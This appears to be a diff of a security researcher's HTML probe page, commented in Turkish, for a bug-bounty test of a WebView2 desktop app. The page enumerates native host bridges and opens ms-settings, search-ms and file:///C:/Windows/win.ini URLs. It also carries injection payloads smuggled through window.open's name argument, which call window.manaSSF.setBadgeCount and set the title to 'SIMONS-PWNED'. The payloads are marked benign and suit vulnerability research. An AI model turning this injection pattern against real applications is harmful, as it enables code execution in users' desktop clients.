@@ -2,18 +2,18 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SDA Probe Page v4</title>
+<title>SDA Probe Page v5</title>
 <style>
-  body{font-family:monospace;background:#111;color:#eee;padding:16px;max-width:900px}
+  body{font-family:monospace;background:#111;color:#eee;padding:16px;max-width:1000px}
   button{font-size:15px;padding:9px 12px;margin:5px 4px;cursor:pointer}
   pre{background:#000;padding:12px;border:1px solid #333;white-space:pre-wrap}
   .warn{color:#f90}
+  iframe{width:100%;height:300px;border:2px solid #f90;margin-top:8px}
 </style>
 </head>
 <body>
-<h1>SDA Probe Page v4 (Simons/Carter — yalnızca test VM'inde koş)</h1>
-<p class="warn">Symphony SDA statik analiz probe'ları. Benign payload (badge=1337, toast metni). Sadece kendi test VM'inde ve <b>hackerone pod</b> gözlemi için.</p>
-<p class="warn">v4 not: F3 payload'ları düzeltildi — eski `//` yaklaşımı if-bloğunun kapanışını yorumluyordu (syntax error). Yeni payload IIFE ile kapanışı korur.</p>
+<h1>SDA Probe Page v5 (Simons/Carter — yalnızca test VM'inde koş)</h1>
+<p class="warn">Benign payload (badge=1337, toast metni). Sadece kendi test VM'inde ve hackerone pod gözlemi için.</p>
 
 <button id="btnInfo">1) Bilgi Dump (otomatik de çalışır)</button>
 <button id="btnToast">2) F1-TOAST (native toast denemesi)</button>
@@ -25,12 +25,24 @@
 <button id="btnF4c">8) F4: file:///C:/Windows/win.ini (window.open)</button>
 <button id="btnF4d">9) F4b: ms-settings:display (location.href navigasyon)</button>
 <button id="btnBBox">10) BBox Dump (callbacks durumu)</button>
+<button id="btnNav" style="background:#722;color:#fff">11) NAV TEST: location.href='https://example.com' (allow-all testi — SON test, sayfa gider!)</button>
+
+<h2 style="color:#f90">▼ IFRAME TEST — gömülü çerçeve (jsDelivr origin) ▼</h2>
+<p class="warn">Aşağıdaki çerçeve FARKLI bir origin'den (cdn.jsdelivr.net) yükleniyor. İçerideki "FRAME F3-INJECT" butonuna tıklayınca sonuçlar hem altta hem üstteki log'a düşer.</p>
+<iframe src="https://cdn.jsdelivr.net/gh/ferattesin/poc-test@main/iframe-child.html" referrerpolicy="no-referrer"></iframe>
 
 <pre id="out">hazır. Bilgi dump için 1'e bas.</pre>
 
 <script>
 const out = [];
 function log(k, v){ out.push(k + ": " + v); document.getElementById('out').textContent = out.join("\n"); }
+window.addEventListener('message', function(e){
+  try {
+    var d = e.data;
+    if (d && d.from === 'IFRAME-CHILD') { log('[IFRAME] ' + d.k, d.v); }
+  } catch(err){}
+});
+
 function dumpInfo(){
   out.length = 0;
   log("location.href", location.href);
@@ -43,6 +55,7 @@ function dumpInfo(){
     const ho = window.chrome && window.chrome.webview ? window.chrome.webview.hostObjects : null;
     log("hostObjects", ho ? (Object.keys(ho).join(",") || "empty") : "n/a");
     if (ho) { try { log("hostObjects.manaSSFBridge", typeof ho.manaSSFBridge); } catch(e){ log("ho.bridge.err", e.message); } }
+    if (ho) { try { log("hostObjects.manaSSFBridge.SetBadgeCount", typeof ho.manaSSFBridge.SetBadgeCount); } catch(e){ log("ho.setbadge.err", e.message); } }
   } catch(e){ log("hostObjects.err", e.message); }
   log("crossOriginIsolated", window.crossOriginIsolated);
   log("hasOpener", !!window.opener);
@@ -87,16 +100,13 @@ document.getElementById('btnProto').onclick = function(){
   } catch(e){ log("F1-PROTO.err", e.message); }
 };
 
-// v4 payload fix: IIFE kapanışı korur, `//` YOK.
-// Sonuç: callback(...) || ... şeklinde değil, ardışık ifadeler:
-//   windowName: 'x'});window.manaSSF.setBadgeCount(1337);(function(){return '' }); }
 const F3_PAYLOAD_BADGE = "x'});window.manaSSF.setBadgeCount(1337);(function(){return '";
 const F3_PAYLOAD_TITLE = "x'});document.title='SIMONS-PWNED';(function(){return '";
 
 document.getElementById('btnF3').onclick = function(){
   try {
     const w = window.open("about:blank", F3_PAYLOAD_BADGE);
-    log("F3-INJECT", "window.open çağrıldı; popout=" + (w ? "olustu" : "null") + " | beklenen: taskbar badge=1337 + log'da 'boundsChangeCallback FIRED'");
+    log("F3-INJECT", "window.open çağrıldı; popout=" + (w ? "olustu" : "null") + " | beklenen: taskbar badge=1337 + 'boundsChangeCallback FIRED'");
   } catch(e){ log("F3-INJECT.err", e.message); }
 };
 
@@ -108,20 +118,24 @@ document.getElementById('btnF3b').onclick = function(){
 };
 
 document.getElementById('btnF4a').onclick = function(){
-  try { const w = window.open("ms-settings:display"); log("F4a ms-settings (window.open)", w ? "pencere-ref alindi" : "null — WebView2 harici protokol akisi (izin diyalogu beklenir)"); }
+  try { const w = window.open("ms-settings:display"); log("F4a ms-settings (window.open)", w ? "pencere-ref alindi" : "null — WebView2 harici protokol akisi"); }
   catch(e){ log("F4a.err", e.message); }
 };
 document.getElementById('btnF4b').onclick = function(){
-  try { const w = window.open("search-ms:query=probe"); log("F4b search-ms (window.open)", w ? "pencere-ref alindi" : "null — WebView2 harici protokol akisi (izin diyalogu beklenir)"); }
+  try { const w = window.open("search-ms:query=probe"); log("F4b search-ms (window.open)", w ? "pencere-ref alindi" : "null — WebView2 harici protokol akisi"); }
   catch(e){ log("F4b.err", e.message); }
 };
 document.getElementById('btnF4c').onclick = function(){
-  try { const w = window.open("file:///C:/Windows/win.ini"); log("F4c file (window.open)", w ? "pencere-ref alindi" : "null — bloklanmis olabilir"); }
+  try { const w = window.open("file:///C:/Windows/win.ini"); log("F4c file (window.open)", w ? "pencere-ref alindi" : "null"); }
   catch(e){ log("F4c.err", e.message); }
 };
 document.getElementById('btnF4d').onclick = function(){
   try { log("F4d", "location.href atanıyor: ms-settings:display"); location.href = "ms-settings:display"; }
   catch(e){ log("F4d.err", e.message); }
+};
+document.getElementById('btnNav').onclick = function(){
+  try { log("NAV-TEST", "location.href='https://example.com' atanıyor — sayfa değişirse allow-all kanıtı ✅"); location.href = "https://example.com/"; }
+  catch(e){ log("NAV-TEST.err", e.message); }
 };
 </script>
 </body>
